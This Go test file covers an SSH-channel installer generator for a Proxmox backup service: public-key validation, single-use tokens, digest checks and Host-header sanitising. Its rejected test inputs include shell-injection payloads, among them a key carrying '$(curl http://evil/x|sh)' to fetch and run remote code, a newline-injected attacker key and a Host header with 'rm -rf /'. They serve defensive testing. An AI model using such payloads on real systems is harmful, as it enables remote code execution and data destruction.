package handlers

import (
	"crypto/sha256"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"goacore/deploy/goabackup"
)

// TestBuildInstallerScript_EmbedsHelperVerbatimWithMatchingSHA is the integrity
// contract: the script inlines the EMBEDDED helper byte-for-byte AND publishes the
// sha256 of that exact embed, so the on-host `sha256sum` check the script runs can
// never reject a faithful install nor accept a tampered one.
func TestBuildInstallerScript_EmbedsHelperVerbatimWithMatchingSHA(t *testing.T) {
	const pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyDataHere goabackup-channel@goacloud"
	script := buildInstallerScript(pub, "dash.example.test:8443")

	// The published EXPECTED_SHA256 must equal the sha256 of the embedded helper.
	sum := sha256.Sum256([]byte(goabackup.Runner))
	want := hex.EncodeToString(sum[:])
	if !strings.Contains(script, `readonly EXPECTED_SHA256="`+want+`"`) {
		t.Errorf("installer does not publish the embedded helper sha256 %s", want)
	}

	// The helper body must appear verbatim inside the quoted heredoc so the on-disk
	// file hashes to EXPECTED_SHA256. Spot-check a distinctive readonly const.
	if !strings.Contains(script, "readonly VMID_SANDBOX_MIN=9500") {
		t.Error("installer does not inline the helper body verbatim (sandbox const missing)")
	}

	// The heredoc must be QUOTED ('GOABACKUP_RUNNER_EOF') so bash performs zero
	// expansion on the helper body — otherwise the on-disk bytes (and the hash) drift.
	if !strings.Contains(script, "<<'GOABACKUP_RUNNER_EOF'") {
		t.Error("helper heredoc is not quoted — bash would expand the body and break the sha256")
	}
}

// TestBuildInstallerScript_PubkeyInjectedAndForcedCommand verifies the authorized_keys
// line is built with the forced-command + restrictions and the CURRENT public key.
// La clé est posée entre guillemets SIMPLES : le script tourne en root sur
// l'hyperviseur du client, aucune expansion ne doit pouvoir s'y produire.
func TestBuildInstallerScript_PubkeyInjectedAndForcedCommand(t *testing.T) {
	const pub = "ssh-ed25519 AAAAExampleKeyDataHere comment"
	script := buildInstallerScript(pub, "host:8443")

	if !strings.Contains(script, `readonly PUBKEY='`+pub+`'`) {
		t.Error("public key not injected verbatim into PUBKEY (single-quoted)")
	}
	if strings.Contains(script, `readonly PUBKEY="`) {
		t.Error("PUBKEY is still double-quoted — shell expansion would apply to it")
	}
	// The forced-command + no-pty restrictions must be present in the authorized_keys
	// assembly (without them the channel would not be locked to the read-only helper).
	for _, frag := range []string{
		`command=\"sudo $HELPER_PATH\"`,
		"no-port-forwarding",
		"no-pty",
	} {
		if !strings.Contains(script, frag) {
			t.Errorf("installer missing authorized_keys restriction %q", frag)
		}
	}
}

// TestBuildInstallerScript_CollapsesMultilinePubkey is the injection guard: a malformed
// pubkey carrying a newline must NOT be able to add a second authorized_keys line. Only
// the first line survives into PUBKEY.
func TestBuildInstallerScript_CollapsesMultilinePubkey(t *testing.T) {
	const evil = "ssh-ed25519 AAAAlegit comment\nssh-ed25519 AAAAattacker injected"
	script := buildInstallerScript(evil, "host")

	if strings.Contains(script, "AAAAattacker") {
		t.Error("multiline pubkey leaked a second key line into the installer (injection)")
	}
	if !strings.Contains(script, `readonly PUBKEY='ssh-ed25519 AAAAlegit comment'`) {
		t.Error("the legitimate first pubkey line was not preserved")
	}
}

// TestValidateChannelPubkey : la clé finit interpolée dans un script exécuté en ROOT
// sur l'hyperviseur du client. Tout ce qui n'est pas une ligne authorized_keys
// prouvablement inerte est refusé — jamais échappé « au mieux ».
func TestValidateChannelPubkey(t *testing.T) {
	valid := []string{
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyDataHere goabackup-channel@goacloud",
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample==",
		"ssh-rsa AAAAB3NzaC1yc2E comment_1-2.3",
	}
	for _, k := range valid {
		if _, err := validateChannelPubkey(k); err != nil {
			t.Errorf("clé légitime refusée %q : %v", k, err)
		}
	}

	invalid := map[string]string{
		"vide":                    "",
		"espaces seuls":           "   ",
		"type inconnu":            "ssh-magic AAAAB3NzaC1yc2E",
		"substitution de comm.":   "ssh-ed25519 AAAAB3Nza $(id > /tmp/pwn)",
		"backticks":               "ssh-ed25519 AAAAB3Nza `id`",
		"guillemet simple":        "ssh-ed25519 AAAAB3Nza x'; id; echo '",
		"point-virgule":           "ssh-ed25519 AAAAB3Nza;id",
		"base64 avec espace":      "ssh-ed25519 AAAA BBBB CCCC DDDD",
		"caractère hors base64":   "ssh-ed25519 AAAA$BBB",
		"pas de partie base64":    "ssh-ed25519",
		"variable dans commentai": "ssh-ed25519 AAAAB3Nza ${HOME}",
	}
	for name, k := range invalid {
		if _, err := validateChannelPubkey(k); err == nil {
			t.Errorf("%s : la clé %q aurait dû être refusée", name, k)
		}
	}
}

// TestBuildInstallerScript_RefusesUnsafePubkey : une clé qui ne valide pas ne doit
// JAMAIS produire un installateur — le script servi refuse et explique.
func TestBuildInstallerScript_RefusesUnsafePubkey(t *testing.T) {
	script := buildInstallerScript("ssh-ed25519 AAAA$(curl http://evil/x|sh)", "host:8443")

	for _, forbidden := range []string{"useradd", "sudoers", "authorized_keys", "curl", "evil"} {
		if strings.Contains(script, forbidden) {
			t.Errorf("le script de refus ne doit rien installer ni recopier l'entrée (%q présent)", forbidden)
		}
	}
	if !strings.Contains(script, "exit 1") {
		t.Error("le script de refus doit sortir en erreur")
	}
}

// TestBuildInstallerScript_IsIdempotentAndSafe spot-checks the idempotency + safety
// invariants the design mandates: getent-guarded useradd with /bin/bash, visudo -cf
// before installing sudoers, and the disk-free self-test.
func TestBuildInstallerScript_IsIdempotentAndSafe(t *testing.T) {
	script := buildInstallerScript("ssh-ed25519 AAAA x", "host")
	for _, frag := range []string{
		"getent passwd \"$GOABACKUP_USER\"", // idempotent user check
		"-s /bin/bash",                      // real login shell (forced-command needs it)
		"visudo -cf",                        // sudoers validated before install
		"SSH_ORIGINAL_COMMAND='disk-free'",  // end-to-end self-test
		"set -euo pipefail",                 // strict mode
	} {
		if !strings.Contains(script, frag) {
			t.Errorf("installer missing required safety fragment %q", frag)
		}
	}
}

// TestHostFromURL strips the scheme, path and API port so the channel target is the
// bare host (the channel itself appends the SSH :22).
func TestHostFromURL(t *testing.T) {
	cases := map[string]string{
		"https://192.0.2.20:8006":      "192.0.2.20",
		"https://192.0.2.20:8006/api2": "192.0.2.20",
		"http://pve.local:8006":        "pve.local",
		"https://10.0.0.1":             "10.0.0.1",
		"":                             "",
		"https://host:8006/?x=1":       "host",
	}
	for in, want := range cases {
		if got := hostFromURL(in); got != want {
			t.Errorf("hostFromURL(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestSanitizeForEcho keeps only host/port-safe characters so a weird r.Host can never
// break the shell comment block it is echoed into.
func TestSanitizeForEcho(t *testing.T) {
	if got := sanitizeForEcho("dash.example.com:8443"); got != "dash.example.com:8443" {
		t.Errorf("clean host mangled: %q", got)
	}
	if got := sanitizeForEcho("evil`whoami`$(id);rm"); got != "evilwhoamiidrm" {
		t.Errorf("sanitizeForEcho left shell metachars: %q", got)
	}
}

// TestChannelRootCommand stays in AUDITABLE mode (download → verify → less → run),
// never a blind curl|sudo bash, and carries -k for the self-signed cert.
func TestChannelRootCommand(t *testing.T) {
	const url = "https://host:8443/canal/installer.sh?t=deadbeef"
	const sha = "1111111111111111111111111111111111111111111111111111111111111111"
	cmd := channelRootCommand(url, sha)

	if !strings.Contains(cmd, "less ") {
		t.Error("root command should download+inspect (less) before running")
	}
	if !strings.Contains(cmd, "curl -k") {
		t.Error("root command must use -k for the self-signed cert")
	}
	if strings.Contains(cmd, url+" | sudo bash") {
		t.Error("root command must NOT be a blind curl|sudo bash pipe")
	}
	// The URL carries a query string: leaving it unquoted would expose '?' to globbing.
	if !strings.Contains(cmd, "'"+url+"'") {
		t.Error("installer URL must be single-quoted in the shell command")
	}
	// The order matters: verify BEFORE less/bash, so a tampered file is never executed.
	iCheck := strings.Index(cmd, "sha256sum -c")
	iBash := strings.Index(cmd, "sudo bash")
	if iCheck < 0 || iBash < 0 || iCheck > iBash {
		t.Fatalf("integrity check must run before sudo bash, got: %s", cmd)
	}
}

// TestChannelRootCommand_VerifiesAgainstUIProvidedDigest is the anti-trompe-l'œil
// contract: the digest the command checks against must be the LITERAL passed by the
// caller (rendered in the TLS-verified page), never a digest re-fetched over the same
// `curl -k` channel as the script — an interceptor would serve both consistently.
func TestChannelRootCommand_VerifiesAgainstUIProvidedDigest(t *testing.T) {
	const sha = "abc123abc123abc123abc123abc123abc123abc123abc123abc123abc123abcd"
	cmd := channelRootCommand("https://host:8443/canal/installer.sh?t=tok", sha)

	if !strings.Contains(cmd, "'"+sha+"  /tmp/goabackup-install.sh' | sha256sum -c -") {
		t.Errorf("command does not check the download against the supplied digest: %s", cmd)
	}
	// A second download (of a .sha256 sidecar, of the helper, of anything) would defeat
	// the whole point: exactly one curl.
	if strings.Count(cmd, "curl ") != 1 {
		t.Errorf("command must perform exactly one download, got: %s", cmd)
	}
}

// TestChannelInstallerURL_IsPublicAndCarriesToken pins the two properties the Proxmox
// root shell depends on: a PUBLIC path (a session-gated one would 303 to /login, which
// curl -fL happily saves as a 200 HTML page) and the one-time token in the query.
func TestChannelInstallerURL_IsPublicAndCarriesToken(t *testing.T) {
	got := channelInstallerURL("dash.example.test:8443", "tok3n")
	want := "https://dash.example.test:8443" + channelInstallerPath + "?t=tok3n"
	if got != want {
		t.Errorf("channelInstallerURL = %q, want %q", got, want)
	}
	if strings.Contains(got, "/api/onboarding/") {
		t.Error("installer URL must not point at the Admin-only onboarding route")
	}
}

// TestInstallerTokenStore_SingleUseAndExpiry is the non-regression test for the token:
// it authenticates exactly one download, and an expired grant is refused (and burned).
func TestInstallerTokenStore_SingleUseAndExpiry(t *testing.T) {
	s := &installerTokenStore{tokens: make(map[string]installerGrant)}

	token, err := s.issue("dash.example.test:8443")
	if err != nil {
		t.Fatalf("issue: %v", err)
	}
	if len(token) != 64 {
		t.Errorf("token length = %d, want 64 hex chars (256 bits)", len(token))
	}

	grant, ok := s.consume(token)
	if !ok {
		t.Fatal("first consume must succeed")
	}
	if grant.instanceHost != "dash.example.test:8443" {
		t.Errorf("grant host = %q, want the host it was minted for", grant.instanceHost)
	}
	if _, ok := s.consume(token); ok {
		t.Error("token must be single use — the second download has to be refused")
	}

	// An expired grant is refused even though it was never used.
	stale, err := s.issue("host")
	if err != nil {
		t.Fatalf("issue: %v", err)
	}
	s.tokens[stale] = installerGrant{expires: time.Now().Add(-time.Second), instanceHost: "host"}
	if _, ok := s.consume(stale); ok {
		t.Error("an expired token must be refused")
	}
	if _, present := s.tokens[stale]; present {
		t.Error("an expired token must be burned, not left in the store")
	}

	// The empty token (no ?t= at all) is never a valid grant.
	if _, ok := s.consume(""); ok {
		t.Error("the empty token must be refused")
	}
}

// TestInstallerTokenStore_IsBounded verifies repeated renders cannot grow the store
// without bound, and that revokeAll invalidates every outstanding command (rotation).
func TestInstallerTokenStore_IsBounded(t *testing.T) {
	s := &installerTokenStore{tokens: make(map[string]installerGrant)}
	for i := 0; i < channelInstallerTokenMax*3; i++ {
		if _, err := s.issue("host"); err != nil {
			t.Fatalf("issue %d: %v", i, err)
		}
	}
	if len(s.tokens) > channelInstallerTokenMax {
		t.Errorf("store holds %d tokens, cap is %d", len(s.tokens), channelInstallerTokenMax)
	}

	last, err := s.issue("host")
	if err != nil {
		t.Fatalf("issue: %v", err)
	}
	s.revokeAll()
	if _, ok := s.consume(last); ok {
		t.Error("revokeAll must invalidate outstanding tokens (key rotation)")
	}
}

// TestHandleOnboardingChannelInstallerToken_RefusesWithoutValidToken is the guard on
// the PUBLIC installer route: no token, empty token or an unknown token must all be
// refused with a 4xx. A redirect (or any 200 carrying non-script content) is precisely
// the failure mode this route exists to avoid — `curl -fL` would save it and bash it.
func TestHandleOnboardingChannelInstallerToken_RefusesWithoutValidToken(t *testing.T) {
	h := &Handler{}
	for _, query := range []string{"", "?t=", "?t=not-a-real-token"} {
		r := httptest.NewRequest(http.MethodGet, channelInstallerPath+query, nil)
		w := httptest.NewRecorder()
		h.HandleOnboardingChannelInstallerToken(w, r)

		if w.Code != http.StatusForbidden {
			t.Errorf("query %q: status = %d, want 403", query, w.Code)
		}
		// Even the refusal body must be inert if it ever reaches a shell.
		if body := w.Body.String(); !strings.HasPrefix(body, "#") {
			t.Errorf("query %q: refusal body must be shell-inert (start with #), got %q", query, body)
		}
	}
}

// TestInstallerDigestIsHostBound explains why the grant carries the instance host: the
// script embeds it, so the digest published in the UI only matches the bytes served
// later if BOTH are computed for the same host — hence the host recorded at mint time
// rather than the Host header of whatever curl shows up.
func TestInstallerDigestIsHostBound(t *testing.T) {
	const pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyDataHere goabackup-channel@goacloud"

	a := sha256Hex(buildInstallerScript(pub, "dash.example.test:8443"))
	if a != sha256Hex(buildInstallerScript(pub, "dash.example.test:8443")) {
		t.Error("the installer digest must be reproducible for a given pubkey + host")
	}
	if a == sha256Hex(buildInstallerScript(pub, "other.example.test:8443")) {
		t.Error("the installer embeds the instance host — a different host must change the digest")
	}
	// A rotated key changes the script, hence the digest: stale commands must not verify.
	if a == sha256Hex(buildInstallerScript(pub+"2", "dash.example.test:8443")) {
		t.Error("a different pubkey must change the installer digest")
	}
}

// TestChannelInstanceHost_SanitizesHostHeader guards the Host header: it lands in a
// command the admin pastes into a ROOT shell, so shell metacharacters must not survive.
func TestChannelInstanceHost_SanitizesHostHeader(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/onboarding/canal", nil)
	r.Host = "evil.test$(id);rm -rf /"
	got := channelInstanceHost(r)
	if strings.ContainsAny(got, "$();/ `&|") {
		t.Errorf("channelInstanceHost left shell metacharacters: %q", got)
	}

	r.Host = ""
	if got := channelInstanceHost(r); got != "localhost:8443" {
		t.Errorf("empty Host = %q, want the localhost fallback", got)
	}
}
